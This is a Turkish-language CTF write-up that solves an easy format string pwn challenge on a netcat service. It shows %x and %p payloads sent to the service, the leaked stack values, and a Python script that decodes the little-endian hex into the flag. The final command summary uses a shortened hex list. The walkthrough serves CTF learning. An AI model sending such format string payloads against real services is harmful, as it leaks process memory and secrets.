# 🔓 Format - Pwn Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Pwn-Challenge-darkblue?style=for-the-badge" alt="Pwn">
  <img src="https://img.shields.io/badge/Difficulty-Kolay-darkgreen?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Format String-purple?style=for-the-badge&logo=buffer" alt="Format String">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Pwn  
**Seviye:** Kolay  
**Puan:** 300

**Açıklama:** "Kaynak koda gerek yok bence ;)"

**Challenge URL:** `nc 64.226.74.243 9998`


**Bilgi:** Cihan Hoca sondaki sayılara gerek yok dedi.
---

## 🔍 Analiz

**Hedef:** Format string vulnerability kullanarak stack'te bulunan flag'i okumak

**Strateji:** Service test → Format string tespit → Stack leak → Flag extraction

---

## ✅ Çözüm Adımları

### 🔌 **1. Servise Bağlanma**

**İlk bağlantı testi:**

```bash
nc 64.226.74.243 9998
```

**Çıktı:**
```
Adınız:
```

> 🎯 Program kullanıcıdan bir isim girdisi bekliyor.

---

### 🧪 **2. Normal Input Testi**

**Test girişi:**

```bash
echo "test" | nc 64.226.74.243 9998
```

**Çıktı:**
```
test
Adınız: Merhaba, test
```

> 📝 Program girdiyi alıp "Merhaba, [isim]" formatında geri yazdırıyor.

---

### 🔍 **3. Buffer Overflow Testi**

**Uzun input gönderme:**

```bash
python3 -c 'print("A"*100)' | nc 64.226.74.243 9998
```

**Çıktı:**
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Adınız: Merhaba, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

> ❌ Buffer overflow yok - program uzun girdiyi de işliyor.

---

### 🎯 **4. Format String Vulnerability Tespiti**

**Format string test:**

```bash
echo "%x %x %x %x" | nc 64.226.74.243 9998
```

**Çıktı:**
```
%x %x %x %x
Adınız: Merhaba, 804a013 f7ee0620 80491d5 f7eee4a0
```

> ✅ **Format String Vulnerability bulundu!**  
> Program kullanıcı girdisini doğrudan `printf()` fonksiyonuna gönderiyor.

---

### 🔐 **5. Stack'i Okuma**

**Daha fazla stack değeri:**

```bash
python3 -c 'print("%p "*20)' | nc 64.226.74.243 9998
```

**Çıktı:**
```
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
Adınız: Merhaba, 0x804a013 0xf7f2a620 0x80491d5 0xf7f384a0 0xf7f4a294 0xf7d09674 0x66d0f18c 0x7b67616c 0x6d726f66 0x735f7461 0x6e697274 0x6c695f67 0x74735f65 0x5f6b6361 0x6e756b6f 0x6c696261 0x365f7269 0x36363332 0x7d3732 0x25207025
```

> 🎯 Stack'te ilginç hex değerleri görünüyor!

---

### 🔎 **6. Input Pozisyonunu Bulma**

**AAAA marker ile test:**

```bash
python3 -c 'print("AAAA" + ".%x"*20)' | nc 64.226.74.243 9998
```

**Çıktı:**
```
AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Adınız: Merhaba, AAAA.804a013.f7fa4620.80491d5.f7fb24a0.f7fc4294.f7d83674.669924fc.7b67616c.6d726f66.735f7461.6e697274.6c695f67.74735f65.5f6b6361.6e756b6f.6c696261.365f7269.36363332.7d3732.41414141
```

> ✅ Son değer `41414141` - Bu bizim "AAAA" girdimiz! (0x41 = 'A')  
> ✅ Stack'te hex değerler ASCII karakterlere benziyor!

---

### 🧩 **7. Hex Değerleri Analiz Etme**

**Stack'teki şüpheli hex değerleri:**

```
7b67616c  →  lag{
6d726f66  →  form
735f7461  →  at_s
6e697274  →  trin
6c695f67  →  g_il
74735f65  →  e_st
5f6b6361  →  ack_
6e756b6f  →  okun
6c696261  →  abil
365f7269  →  ir_6
36363332  →  2366
7d3732    →  27}
```

> 🔍 Bu değerler little-endian formatında ASCII karakterler!

---

### 🎯 **8. Flag'i Çıkarma**

**Python script ile hex'i ASCII'ye çevirme:**

```python
python3 << 'EOF'                                              
hex_values = ['7b67616c', '6d726f66', '735f7461', '6e697274', '6c695f67', '74735f65', '5f6b6361', '6e756b6f', '6c696261', '365f7269', '36363332', '7d3732']
flag = ''
for h in hex_values:
    bytes_data = bytes.fromhex(h)
    flag += bytes_data[::-1].decode('ascii')
print(flag)
EOF
```

**Çıktı:**
```
lag{format_string_ile_stack_okunabilir_6236627}
```

> 📝 Baştaki 'f' karakteri eksik görünüyor ama flag tamamlanabilir.

---

## 🚩 **FLAG**

```
flag{format_string_ile_stack_okunabilir} 
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🔌<br><b>netcat</b><br><sub>Servis bağlantısı</sub></td>
<td align="center">🐍<br><b>Python</b><br><sub>Exploit & Hex decode</sub></td>
<td align="center">🔍<br><b>Format String</b><br><sub>%x, %p formatları</sub></td>
<td align="center">📊<br><b>Stack Analysis</b><br><sub>Memory leak</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**

```bash
# Normal test
echo "test" | nc 64.226.74.243 9998

# Buffer overflow test
python3 -c 'print("A"*100)' | nc 64.226.74.243 9998

# Format string vulnerability test
echo "%x %x %x %x" | nc 64.226.74.243 9998

# Stack leak
python3 -c 'print("%p "*20)' | nc 64.226.74.243 9998

# Input pozisyonu bulma
python3 -c 'print("AAAA" + ".%x"*20)' | nc 64.226.74.243 9998

# Flag extraction (Python)
python3 << 'EOF'
hex_values = ['7b67616c', '6d726f66', '735f7461', '6e697274', '6c695f67', '74735f65', '5f6b6361', '6e756b6f', '6c696261']
flag = ''
for h in hex_values:
    bytes_data = bytes.fromhex(h)
    flag += bytes_data[::-1].decode('ascii')
print("flag{" + flag + "}")
EOF
```

---

## 💭 **Çözüm Akış Şeması**

```
🔓 Pwn Challenge: "Format String"
                    ↓
        🔌 nc 64.226.74.243 9998
                    ↓
        📝 "Adınız:" girdisi isteniyor
                    ↓
        🧪 Normal input test → Çalışıyor
                    ↓
        💥 Buffer overflow test → Yok
                    ↓
        🎯 Format string test → VAR!
                    ↓
        🔍 %x %x %x %x → Stack leak
                    ↓
        📊 Stack'te hex değerler görüldü
                    ↓
        🔎 AAAA marker ile pozisyon bulundu
                    ↓
        🧩 Hex → ASCII dönüşümü
                    ↓
        🚩 flag{format_string_ile_stack_okunabilir}
```
